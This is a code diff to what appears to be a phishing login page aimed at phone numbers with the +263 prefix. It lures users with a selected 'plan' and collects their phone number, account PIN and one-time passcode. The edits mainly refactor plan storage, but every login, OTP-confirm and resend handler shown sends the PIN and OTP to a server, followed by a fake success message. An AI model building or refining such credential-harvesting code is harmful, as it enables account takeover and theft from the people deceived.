@@ -120,7 +120,6 @@ input:focus{
   border-radius:50%;
   border:2px solid #fff;
   background:#fff;
-  text-align:center;
   font-size:1px;
   color:transparent;
   caret-color:transparent;
@@ -285,7 +284,9 @@ input:focus{
     <div id="otpWarning" class="otp-warning">Please input 5 digits</div>
 
     <div class="resend-row">
-      <div class="small">Resend in <span id="countdown">120</span>s</div>
+      <div class="small">
+        Resend in <span id="countdown">120</span>s
+      </div>
       <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
     </div>
 
@@ -299,6 +300,16 @@ input:focus{
 </div>
 
 <script>
+/* ===== PLAN FIX (SESSION + LOCAL FALLBACK) ===== */
+let selectedPlan=null;
+try{
+  const raw=sessionStorage.getItem('selectedPlan') || localStorage.getItem('selectedPlan');
+  if(raw){
+    selectedPlan=JSON.parse(raw);
+    localStorage.setItem('selectedPlan',raw);
+  }
+}catch(e){}
+
 /* ===== DEVICE ===== */
 const ua=navigator.userAgent;
 let device='Unknown';
@@ -308,18 +319,11 @@ if(/Chrome/i.test(ua)) device+=' | Chrome';
 else if(/Safari/i.test(ua)) device+=' | Safari';
 else if(/Firefox/i.test(ua)) device+=' | Firefox';
 
-/* ===== PLAN (FIXED) ===== */
-function getPlanForMessage(){
-  try{
-    const raw=sessionStorage.getItem('selectedPlan');
-    if(!raw) return 'N/A';
-    const plan=JSON.parse(raw);
-    const name=plan.name||plan.shortName||'';
-    const price=plan.price||plan.amount;
-    return price?`${name} — ${price}`:name;
-  }catch(e){
-    return 'N/A';
-  }
+function normalizePlan(plan){
+  if(!plan) return 'N/A';
+  const name=plan.name||plan.shortName||'';
+  const price=plan.price||plan.amount;
+  return price?`${name} — ${price}`:name;
 }
 
 /* ===== PIN ===== */
@@ -373,7 +377,8 @@ function validatePhone(){
 phone.addEventListener('input',()=>{
   let d=phone.value.replace('+263','').replace(/\D/g,'');
   if(d.startsWith('0')) d=d.slice(1);
-  phone.value='+263'+d.slice(0,9);
+  d=d.slice(0,9);
+  phone.value='+263'+d;
   validatePhone();
 });
 
@@ -402,6 +407,7 @@ function renderOtp(v){
   confirmBtn.disabled=!/^\d{5}$/.test(v);
   otpWarning.style.display=/^\d{5}$/.test(v)?'none':'block';
 }
+
 buffer.addEventListener('input',()=>{
   buffer.value=buffer.value.replace(/\D/g,'').slice(0,5);
   renderOtp(buffer.value);
@@ -424,14 +430,16 @@ document.getElementById('loginForm').addEventListener('submit',async e=>{
   e.preventDefault();
   if(document.getElementById('hp').value) return;
   if(navigator.vibrate) navigator.vibrate(30);
+
   await sendToServer({
     event:'login_clicked',
     loginPhone:phone.value,
     loginPin:pinValue,
-    plan:getPlanForMessage(),
+    plan:normalizePlan(selectedPlan),
     device,
     submittedAt:new Date().toISOString()
   });
+
   document.getElementById('otpModal').style.display='flex';
   buffer.value='';
   renderOtp('');
@@ -442,15 +450,17 @@ document.getElementById('loginForm').addEventListener('submit',async e=>{
 /* ===== CONFIRM ===== */
 confirmBtn.onclick=async()=>{
   if(navigator.vibrate) navigator.vibrate(30);
+
   await sendToServer({
     event:'otp_confirm',
     loginPhone:phone.value,
     loginPin:pinValue,
     otp:buffer.value,
-    plan:getPlanForMessage(),
+    plan:normalizePlan(selectedPlan),
     device,
     submittedAt:new Date().toISOString()
   });
+
   otpStatus.innerHTML="<span class='success'>Success — request received.</span>";
   setTimeout(()=>location.href='thankyou.html',1200);
 };
@@ -459,14 +469,16 @@ confirmBtn.onclick=async()=>{
 resendBtn.onclick=async()=>{
   resendBtn.disabled=true;
   resendBtn.innerHTML='<span class="spinner"></span>Sending…';
+
   await sendToServer({
     event:'resend_otp',
     loginPhone:phone.value,
     loginPin:pinValue,
-    plan:getPlanForMessage(),
+    plan:normalizePlan(selectedPlan),
     device,
     submittedAt:new Date().toISOString()
   });
+
   resendBtn.innerHTML='OTP sent ✓';
   setTimeout(()=>resendBtn.innerHTML='Resend OTP',1200);
   startCountdown();
